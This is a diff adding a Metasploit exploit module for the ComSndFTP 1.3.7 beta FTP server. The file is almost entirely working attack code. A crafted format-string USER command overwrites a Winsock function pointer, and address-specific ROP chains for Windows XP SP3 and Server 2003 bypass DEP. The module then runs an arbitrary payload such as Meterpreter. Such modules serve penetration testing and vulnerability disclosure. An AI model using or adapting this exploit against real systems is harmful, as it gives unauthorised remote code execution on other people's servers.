@@ -1,0 +1,202 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = GoodRanking
+
+	include Msf::Exploit::Remote::Tcp
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'          => 'ComSndFTP v1.3.7 Beta USER Buffer Overflow',
+			'Description'   => %q{
+					This module exploits the ComSndFTP FTP Server version 1.3.7 beta by sending a specially
+				crafted format string specifier as a username. The crafted username is sent to to the server to
+				overwrite the hardcoded function pointer from Ws2_32.dll!WSACleanup. Once this function pointer
+				is triggered, the code bypasses dep and then repairs the pointer to execute arbitrary code.
+				The SEH exit function is preferred so that the administrators are not left with an unhandled
+				exception message. When using the meterpreter payload, the process will never die, allowing
+				for continuous exploitation.
+			},
+			'Author'        =>
+				[
+					'ChaoYi Huang <ChaoYi.Huang[at]connect.polyu.hk>', # vuln discovery + poc
+					'rick2600 <rick2600[at]corelan.be>',               # msf module (target XP)
+					'mr_me <mr_me[at]@corelan.be>',                    # msf module (target 23k)
+					'corelanc0d3r <peter.ve[at]corelan.be>'            # msf module
+				],
+			'Arch'          => [ ARCH_X86 ],
+			'License'       => MSF_LICENSE,
+			'Version'       => '$Revision$',
+			'References'    =>
+				[
+					# When a DoS is NOT a DoS
+					[ 'EDB', '19024']
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'seh'
+				},
+			'Platform'      => ['win'],
+			'Privileged'    => false,
+			'Payload'       =>
+				{
+					'Space'            => 1000,
+					'BadChars'         => "\x00\x0a\x0d",
+					'StackAdjustment'  => -3500,
+					'DisableNops'      => 'True'
+				},
+			'Targets'       =>
+				[
+					[
+						'Windows XP SP3 - English',
+						{
+							'Functionpointer'   => 0x71AC4050,  # winsock pointer
+							'Functionaddress'   => 0x71AB2636,  # the repair address
+							'Pivot'             => 0x00408D16,  # 0x004093AE-0x698 add esp, 72c ; retn
+							'Pad' => 568
+						}
+					],
+					[
+						'Windows Server 2003 - English',
+						{
+							'Functionpointer'   => 0x71C14044,  # winsock pointer
+							'Functionaddress'   => 0x71C02661,  # the repair address
+							'Pivot'             => 0x00408D16,  # 0x004093AE-0x698 add esp, 72c ; retn
+							'Pad' => 568
+						}
+					]
+				],
+			'DisclosureDate' => 'Jun 08 2012'))
+
+		register_options(
+			[
+				Opt::RPORT(21),
+			], self.class)
+	end
+
+	def check
+		connect
+		banner    = sock.get(-1,3)
+		validate  = "\x32\x32\x30\x20\xbb\xb6\xd3\xad\xb9"
+		validate << "\xe2\xc1\xd9\x46\x54\x50\xb7\xfe\xce"
+		validate << "\xf1\xc6\xf7\x21\x0d\x0a"
+		disconnect
+
+		if (banner == validate)
+			return Exploit::CheckCode::Vulnerable
+		end
+		return Exploit::CheckCode::Safe
+	end
+
+	def junk(n=4)
+		return rand_text_alpha(n).unpack("V").first
+	end
+
+	def exploit
+
+		rop = ''
+		if target.name =~ /Server 2003/
+			# C:\WINDOWS\system32\msvcrt.dll v7.0.3790.3959
+			rop = [
+				0x77be3adb, # pop eax ; retn
+				0x77ba1114, # <- *&VirtualProtect()
+				0x77bbf244, # mov eax,[eax] ; pop ebp ; retn
+				junk,
+				0x77bb0c86, # xchg eax,esi ; retn
+				0x77be3adb, # pop eax ; retn
+				0xFFFFFBFF, # dwSize
+				0x77BAD64D, # neg eax ; pop ebp ; retn
+				junk,
+				0x77BBF102, # xchg eax,ebx ; add [eax],al ; retn
+				0x77bbfc02, # pop ecx ; retn
+				0x77bef001, # ptr that is w+
+				0x77bd8c04, # pop edi ; retn
+				0x77bd8c05, # retn
+				0x77be3adb, # pop eax ; retn
+				0xFFFFFFC0, # flNewProtect
+				0x77BAD64D, # neg eax ; pop ebp ; retn
+				0x77be2265, # ptr to 'push esp ; ret'
+				0x77BB8285, # xchg eax,edx ; retn
+				0x77be3adb, # pop eax ; retn
+				0x90909090, # nops
+				0x77be6591, # pushad ; add al,0ef ; retn
+			].pack("V*")
+
+		elsif target.name =~ /XP SP3/
+			# C:\WINDOWS\system32\msvcrt.dll v7.0.2600.5512
+			rop = [
+				0x77C21D16, # pop eax ; retn
+				0x77C11120, # <- *&VirtualProtect()
+				0x77C2E493, # mov eax,[eax] ; pop ebp ; retn
+				junk,
+				0x77C21891, # pop esi ; retn
+				0x77C5D010, # ptr that is w+
+				0x77C2DD6C, # xchg eax,esi ; add [eax],al; retn
+				0x77C21D16, # pop eax ; retn
+				0xFFFFFBFF, # dwSize
+				0x77C1BE18, # neg eax ; pop ebp ; retn
+				junk,
+				0x77C2362C, # pop ebx ; retn
+				0x77C5D010, # ptr that is w+
+				0x77C2E071, # xchg eax,ebx ; add [eax],al ; retn
+				0x77C1F519, # pop ecx ; retn
+				0x77C5D010, # ptr that is w+
+				0x77C23B47, # pop edi ; retn
+				0x77C23B48, # retn
+				0x77C21D16, # pop eax ; retn
+				0xFFFFFFC0, # flNewProtect
+				0x77C1BE18, # neg eax ; pop ebp ; retn
+				0x77C35459, # ptr to 'push esp ; ret'
+				0x77C58FBC, # xchg eax,edx ; retn
+				0x77C21D16, # pop eax ; retn
+				0x90909090, # nops
+				0x77C567F0, # pushad ; add al,0ef ; retn
+			].pack("V*")
+		end
+
+		stage1 = %Q{
+			mov eax, #{target['Functionpointer']}
+			mov ecx, #{target['Functionaddress']}
+			mov [eax], ecx
+		}
+
+		offset_wp = rand_text_alphanumeric(1)
+		pivot     = target['Pivot']
+		offset    = target['Pad'] + rop.length + stage1.length + payload.encoded.length
+
+		attackstring  = rand_text_alphanumeric(7)
+		attackstring << [target['Functionpointer']].pack('V')
+		attackstring << "%#{pivot}x"                          # special pointer to our pivot
+		attackstring << "%p" * 208 + "#{offset_wp }%n"        # format specifiers to read and write the function pointer
+		attackstring << rand_text_alphanumeric(target['Pad'])
+		attackstring << rop
+		attackstring << Metasm::Shellcode.assemble(Metasm::Ia32.new, stage1).encode_string
+		attackstring << payload.encoded
+		attackstring << rand_text_alphanumeric(2000 - offset)
+		attackstring << "\r\n"
+
+		sploit = "USER #{attackstring}\r\n"
+
+		print_status("Triggering overflow...")
+		connect
+		sock.get_once(1024)
+		sock.put(sploit)
+		select(nil, nil, nil, 2)
+		handler
+		disconnect
+
+	end
+
+end
